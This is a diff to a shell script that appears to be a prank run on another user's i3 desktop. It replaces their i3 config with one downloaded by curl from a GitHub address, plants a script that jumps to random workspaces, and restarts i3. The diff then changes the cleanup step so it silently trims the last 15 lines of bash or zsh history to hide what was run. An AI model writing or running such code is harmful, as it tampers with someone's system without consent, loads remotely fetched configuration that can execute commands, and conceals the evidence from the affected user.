@@ -1,10 +1,17 @@
-#/bin/sh
+#!/bin/sh
+
+remove()
+{
+    for i in $(seq 15); do
+        sed -i '$ d' "$1"
+    done
+}
 
 mv ~/.config/i3/config ~/.config/i3/oldconfig
 curl https://raw.githubusercontent.com/Ellmos/cf/main/config > ~/.config/i3/config
 
-hehe="~/.config/i3/hehehe.sh"
-rm "$hehe"
+hehe="$HOME/.config/i3/hehehe.sh"
+rm -f "$hehe"
 echo '#!/bin/sh' >> "$hehe"
 echo '' >> "$hehe"
 echo 'i3-msg "workspace" $(( $RANDOM % 10))' >> "$hehe"
@@ -17,7 +24,7 @@ i3 restart
 
 history -c
 if [[ "$SHELL" == *"bash"* ]]; then
-    rm ~/.bash_history
+    remove "$HOME/.bash_history"
 elif [[ "$SHELL" == *"zsh"* ]]; then
-    rm ~/.zsh_history
+    remove "$HOME/.zsh_history"
 fi
